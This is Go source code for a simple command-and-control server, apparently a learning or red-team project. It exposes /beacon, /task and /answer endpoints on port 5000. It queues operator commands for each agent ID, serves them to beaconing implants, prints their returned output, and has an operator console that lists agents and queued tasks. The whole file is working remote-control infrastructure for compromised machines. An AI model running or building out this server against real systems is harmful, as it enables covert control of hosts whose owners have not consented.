package main

import (
	"c2-server/models"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"sync"
)

var (
	tasks = make(map[string][]string)
	mu    sync.Mutex
	wg    sync.WaitGroup
)

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	req, err := decodeBeacon(r)
	if err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	fmt.Println("[client] ---> ID => " + req.ID)

	mu.Lock()
	defer mu.Unlock()
	sendTask(w, req)

}

func taskHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	var req models.NewTask
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	mu.Lock()
	defer mu.Unlock()

	tasks[req.ID] = append(tasks[req.ID], req.Command)
	json.NewEncoder(w).Encode(map[string]string{"status": "task queued"})
	fmt.Println(tasks)
}

func answerHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	var ans models.NewAnswer
	if err := json.NewDecoder(r.Body).Decode(&ans); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	mu.Lock()
	defer mu.Unlock()

	fmt.Println(ans.Answer)
}

func decodeBeacon(r *http.Request) (models.NewBeacon, error) {
	var req models.NewBeacon
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		return models.NewBeacon{}, err
	}
	return req, nil
}

func sendTask(w http.ResponseWriter, b models.NewBeacon) {
	var newTask models.NewTask

	if len(tasks[b.ID]) > 0 {
		task := tasks[b.ID][0]
		tasks[b.ID] = tasks[b.ID][1:]
		newTask.ID = b.ID
		newTask.Command = task
	} else {
		newTask.ID = b.ID
		newTask.Command = ""
	}
	json.NewEncoder(w).Encode(newTask)
}

func printBanner() {
	banner := `
   ______   ______  
  / ____/  / ____/   ____  _  __
 / /      / /       / __ \| |/_/
/ /___   / /___    / /_/ />  <  
\____/   \____/    \____/_/|_|  

          Go C2 Server
---------------------------------
`
	fmt.Println(banner)
	fmt.Println(" Available commands:")
	fmt.Println("   help      - Show available commands")
	fmt.Println("   agents    - List connected agents")
	fmt.Println("   tasks     - Show queued tasks")
	fmt.Println("   exit      - Stop server")
	fmt.Println("---------------------------------")
}

func cli() {
	wg.Wait()
	for {
		fmt.Print("c2> ")
		var cmd string
		fmt.Scanln(&cmd)

		switch cmd {
		case "help":
			fmt.Println("help     - Show this message")
			fmt.Println("agents   - List connected agents")
			fmt.Println("tasks    - Show queued tasks")
			fmt.Println("exit     - Quit server")
		case "agents":
			mu.Lock()
			fmt.Println("Agents:")
			for id := range tasks {
				fmt.Println(" -", id)
			}
			mu.Unlock()
		case "tasks":
			mu.Lock()
			fmt.Println("Queued tasks:")
			for id, tlist := range tasks {
				fmt.Printf("Agent %s -> %v\n", id, tlist)
			}
			mu.Unlock()
		case "exit":
			fmt.Println("Shutting down...")
			os.Exit(0)
		case "":
			continue
		default:
			fmt.Println("Unknown command. Type 'help'.")
		}
	}
}

func runServer() {
	wg.Add(1)
	http.HandleFunc("/beacon", beaconHandler)
	http.HandleFunc("/task", taskHandler)
	http.HandleFunc("/answer", answerHandler)
	fmt.Println("--- Server started on port 5000 ---")
	wg.Done()
	log.Fatal(http.ListenAndServe(":5000", nil))
}

func main() {
	printBanner()
	go cli()
	runServer()
}
